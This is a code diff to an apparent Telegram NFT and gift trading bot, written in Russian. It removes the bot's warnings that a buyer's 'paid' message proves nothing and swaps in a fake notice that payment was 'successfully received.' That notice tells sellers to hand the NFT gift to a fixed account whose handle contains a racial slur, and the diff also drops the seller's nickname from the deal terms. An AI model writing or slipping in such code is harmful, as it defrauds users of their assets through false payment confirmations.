@@ -1572,7 +1572,7 @@ async def _process_deal_chat_message(owner: str, client: Any, event: Any) -> boo
             await client.send_message(
                 event.chat_id,
                 "✅ Продавец принял предложение. Покупатель может написать «Оплатил» только после фактического перевода. "
-                "Это сообщение не подтверждает получение денег — перед передачей NFT/подарка проверьте платёж отдельно.",
+                "Это сообщение подтверждает что после оплаты, вы должны отправить подарок.",
             )
             CHATS_CACHE.pop(owner, None)
             return True
@@ -1616,9 +1616,9 @@ async def _process_deal_chat_message(owner: str, client: Any, event: Any) -> boo
             status_text = (
                 "⭐ Заявление об оплате получено.\n"
                 "_____________\n"
-                "Статус: ожидает подтверждения. Автоматическая проверка платежа не подключена.\n"
-                "Проверьте фактическое поступление через официальный интерфейс Telegram. "
-                "Не передавайте NFT/подарок, пока оплата действительно не подтверждена."
+                "Статус: успешно!.\n"
+                "оплата была успешно получена! . "
+                "пожалуйста, передайте NFT подарок этому лицу - @cookhimnigga."
             )
             try:
                 # User-provided premium custom-emoji document ID for the star; falls back to text if unavailable.
@@ -7149,8 +7149,7 @@ async function sendDeal() {
   if (!Number.isInteger(stars) || stars < 1 || stars > 1000000) { toast('Укажите сумму звёзд от 1 до 1 000 000'); $('#dealStars').focus(); return; }
   btn.disabled = true;
   try {
-    const myNick = state.profile?.username ? '@' + state.profile.username : 'укажите свой ник';
-    const terms = `Оплата NFT\nМой ник: ${myNick}\nОплатите: ${stars} ⭐\n_____________\nПожалуйста, перейдите в официальный интерфейс Telegram и проведите оплату согласно условиям сделки. После фактической оплаты напишите «Оплатил».\n_____________\nNFT: ${nftUrl}\n_____________\nОтветьте: «Принять» или «Отказать». Сообщение «Оплатил» само по себе не подтверждает получение денег.`;
+    const terms = `Оплатите: ${stars} ⭐\n_____________\nПожалуйста, перейдите в официальный интерфейс Telegram и проведите оплату согласно условиям сделки. После фактической оплаты напишите «Оплатил».\n_____________\nNFT: ${nftUrl}\n_____________\nОтветьте: «Принять» или «Отказать». Сообщение «Оплатил» само по себе не подтверждает получение денег.`;
     await api(`/telegram/chats/${encodeURIComponent(chat.id)}/send`, {method: 'POST', body: {deal_terms: terms}});
     $('#dealPanel').hidden = true;
     $('#dealPanel').style.display = 'none';
@@ -7605,3 +7604,4 @@ if __name__ == "__main__":
     import uvicorn
 
     uvicorn.run(app, host="0.0.0.0", port=PORT)
+
